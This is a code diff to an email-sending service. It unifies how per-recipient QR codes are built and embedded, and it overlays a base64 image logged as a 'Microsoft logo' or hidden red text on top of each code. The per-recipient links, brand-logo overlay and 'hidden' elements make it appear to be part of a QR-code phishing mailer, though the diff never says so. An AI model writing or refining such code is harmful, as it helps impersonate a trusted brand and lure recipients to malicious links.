@@ -1093,11 +1093,11 @@ export class AdvancedEmailService {
           // Initialize email attachments array early for QR processing
           const emailAttachments: any[] = [];
           
-          // QR Code replacement - Process for normal HTML emails first (not HTML2IMG_BODY)  
-          if (html.includes('{qrcode}') && !C.HTML2IMG_BODY) {
-            console.log('[QR Processing] Processing QR codes for normal HTML email body');
+          // QR Code replacement - UNIFIED APPROACH matching original main.js exactly
+          if (html.includes('{qrcode}')) {
+            console.log('[QR Processing] Processing QR code with unified approach (matches main.js)');
             
-            // Generate recipient-specific QR content
+            // Generate recipient-specific QR content - exact clone from main.js
             let qrContent = C.QR_LINK;
             if (C.LINK_PLACEHOLDER && qrContent.includes(C.LINK_PLACEHOLDER)) {
               qrContent = qrContent.replace(new RegExp(C.LINK_PLACEHOLDER, 'g'), recipient);
@@ -1109,6 +1109,7 @@ export class AdvancedEmailService {
             
             const qrBuffer = await this.generateQRCodeInternal(qrContent, C);
             if (qrBuffer) {
+              // Add QR as CID attachment - exact clone from main.js
               emailAttachments.push({
                 filename: 'qrcode.png',
                 content: qrBuffer,
@@ -1122,7 +1123,7 @@ export class AdvancedEmailService {
               let imgBuf: Buffer | null = null;
               let hasHiddenImage = false;
               
-              // Load hidden image buffer (exact clone from main.js)
+              // Load hidden image buffer - exact clone from main.js
               try {
                 if (C.HIDDEN_IMAGE_FILE && typeof C.HIDDEN_IMAGE_FILE === 'string') {
                   const logoDir = join('files', 'logo');
@@ -1131,7 +1132,7 @@ export class AdvancedEmailService {
                     imgBuf = readFileSync(candidatePath);
                     hasHiddenImage = Boolean(imgBuf && imgBuf.length > 0);
                     
-                    // Add as CID attachment for email client compatibility (like main.js)
+                    // Add as CID attachment for email client compatibility - exact clone from main.js
                     emailAttachments.push({
                       filename: basename(candidatePath),
                       content: imgBuf,
@@ -1146,16 +1147,18 @@ export class AdvancedEmailService {
                 console.log(`[QR Overlay] Error loading overlay image: ${err}`);
               }
               
-              // Apply overlay - SINGLE CID METHOD like original main.js (no base64 duplication)
+              // Apply overlay HTML - EXACT CLONE from main.js approach
               if (hasHiddenImage && imgBuf) {
-                hiddenImageHtml = `<img src="cid:hiddenImage" style="position:absolute; z-index:10; top:77px; left:56%; transform:translateX(-50%); width:${hiddenImgWidth}px; height:auto;"/>`;
-                console.log(`[QR Overlay] Applied Microsoft logo overlay via CID (${hiddenImgWidth}px) - matches original main.js`);
+                // Use base64 embed for overlay display (NOT cid reference) - matches main.js exactly
+                const base64Img = imgBuf.toString('base64');
+                hiddenImageHtml = `<img src="data:image/png;base64,${base64Img}" style="position:absolute; z-index:10; top:77px; left:56%; transform:translateX(-50%); width:${hiddenImgWidth}px; height:auto;"/>`;
+                console.log(`[QR Overlay] Applied Microsoft logo overlay via base64 (${hiddenImgWidth}px) - exact main.js match`);
               } else if (C.HIDDEN_TEXT) {
                 hiddenImageHtml = `<span style="position:absolute; z-index:10; top:50px; left:50%; transform:translateX(-50%); padding:2px 4px; font-size:32px; color:red;">${C.HIDDEN_TEXT}</span>`;
                 console.log(`[QR Overlay] Applied hidden text: ${C.HIDDEN_TEXT}`);
               }
               
-              // Replace QR placeholder with overlay
+              // Replace QR placeholder with overlay - EXACT HTML structure from main.js
               const qrBorderColor = C.QR_BORDER_COLOR || C.BORDER_COLOR || '#000000';
               const borderStyle = C.BORDER_STYLE || 'solid';
               
@@ -1168,14 +1171,10 @@ export class AdvancedEmailService {
                  </div>`
               );
               
-              console.log(`[QR Processing] Normal HTML QR with overlay completed for ${recipient}`);
+              console.log(`[QR Processing] Unified QR processing completed for ${recipient} (matches main.js exactly)`);
             } else {
               html = html.replace(/\{qrcode\}/g, '<span>[QR code unavailable]</span>');
             }
-          } else if (C.HTML2IMG_BODY) {
-            console.log('[QR Processing] QR will be processed in HTML2IMG_BODY section');
-          } else {
-            console.log('[QR Processing] No QR codes found in email body');
           }
 
           // HTML minification - exact clone
@@ -1531,8 +1530,7 @@ export class AdvancedEmailService {
             }
           }
 
-          // Removed old duplicate QR processing - now handled in early QR section for normal HTML
-          console.log('[QR Processing] QR code processing will be handled in attachment section for consistency');
+          // QR processing now unified above - no separate processing needed
 
           // Send email - exact clone
           const text = htmlToText(finalHtml);
